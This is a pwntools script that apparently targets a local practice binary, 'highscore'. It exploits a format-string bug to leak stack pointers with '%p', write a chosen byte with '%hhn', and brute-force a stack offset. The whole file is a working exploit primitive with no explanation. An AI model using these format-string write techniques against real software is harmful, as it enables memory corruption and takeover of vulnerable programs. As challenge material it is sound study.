from pwn import *

context.log_level = 'error'
BIN = './highscore'


def set_name(p, payload):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'Enter new name: ')
    p.sendline(payload)
    p.recvuntil(b'Player: ')
    return p.recvline().strip()


def leak_ptr(p, idx):
    out = set_name(p, f"%{idx}$p".encode())
    if out == b'(nil)':
        return 0
    return int(out.decode(), 16)


def write_hhn(p, addr, val):
    width = val if val != 0 else 256
    fmt = f"%{width}c%12$hhn".encode()
    payload = fmt.ljust(16, b'A') + p64(addr)
    set_name(p, payload)


print('delta | l18 | before17 | after17 | status')
for delta in range(0xE0, 0x111):
    p = process(BIN)
    status = 'ok'
    try:
        l18 = leak_ptr(p, 18)
        b17 = leak_ptr(p, 17)
        target = l18 - delta
        write_hhn(p, target, 0x42)
        a17 = leak_ptr(p, 17)
        if (a17 & 0xFF) == 0x42:
            status = 'MATCH'
        print(f"{delta:#04x} | {l18:#x} | {b17:#x} | {a17:#x} | {status}")
    except Exception as e:
        print(f"{delta:#04x} | 0x0 | 0x0 | 0x0 | crash/{type(e).__name__}")
    finally:
        try:
            p.close()
        except Exception:
            pass
